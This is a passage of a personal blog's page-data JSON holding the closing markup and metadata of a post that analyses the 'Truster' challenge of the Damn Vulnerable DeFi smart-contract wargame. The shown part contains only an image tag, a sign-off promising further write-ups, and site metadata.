hI9VyGri0bC9b49Rj/cvSsSyYHFwPK8JmlFMk2yiqUVyzSdq9hLPJ8TQJNUTut99MfP/w3lw7g+Dvpx1Idp/dymfm5rnru1czt72NvDrXn495t3/wfs3MBxActFpAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"solve\"\n        title=\"solve\"\n        src=\"/static/a17116aeca6eef7892b9cde00f6078ff/37523/c3-3.png\"\n        srcset=\"/static/a17116aeca6eef7892b9cde00f6078ff/e9ff0/c3-3.png 180w,\n/static/a17116aeca6eef7892b9cde00f6078ff/f21e7/c3-3.png 360w,\n/static/a17116aeca6eef7892b9cde00f6078ff/37523/c3-3.png 720w,\n/static/a17116aeca6eef7892b9cde00f6078ff/e996b/c3-3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>","frontmatter":{"date":"July 29, 2022","title":"Damn Vulnerable DeFi Wargame Challenge3 — Truster Contract Analysis🤔","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-3/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/defi-wargame-2/","nextSlug":"/defi-wargame-1/","prevSlug":"/defi-wargame-3/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}